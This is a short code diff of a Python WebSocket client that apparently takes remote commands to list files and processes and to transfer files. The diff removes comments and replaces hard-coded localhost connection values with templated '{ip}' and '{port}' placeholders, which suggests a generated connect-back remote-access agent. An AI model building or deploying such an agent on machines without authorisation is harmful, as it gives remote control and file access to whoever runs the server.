@@ -106,7 +106,6 @@ def cleanup_download():
         file_write_handle = None
     download_in_progress = False
     current_filename = None
-    #print("Download state cleaned up.")
 
 def upload_file(ws, file_path):
     filename = os.path.basename(file_path)
@@ -139,7 +138,6 @@ def list_processes(ws):
     except Exception as e:
         send_result(ws, f"Error listing processes: {str(e)}")
 
-# Handle incoming commands
 def handle_command(ws, command):
     if command == "list_files":
         list_files(ws)
@@ -156,13 +154,12 @@ def handle_command(ws, command):
     else:
         send_result(ws, "Unknown command")
 
-# Main entry point for the WebSocket client
 if __name__ == "__main__":
-    # ip = "{ip}"
-    # port = "{port}"
-    ip = "127.0.0.1"
-    port = "8081"
-    websocket_url = "ws://"+ip+":"+port+"/ws"  # Change to your WebSocket server URL
+    ip = "{ip}"
+    port = "{port}"
+    # ip = "127.0.0.1"
+    # port = "8081"
+    websocket_url = "ws://"+ip+":"+port+"/ws"
     ws = websocket.WebSocketApp(websocket_url,
                                 on_message=on_message,
                                 on_error=on_error,
@@ -174,7 +171,7 @@ if __name__ == "__main__":
 
     try:
         while True:
-            pass  # Keep the main thread alive
+            pass
     except KeyboardInterrupt:
         ws.close()
         print("WebSocket client closed")
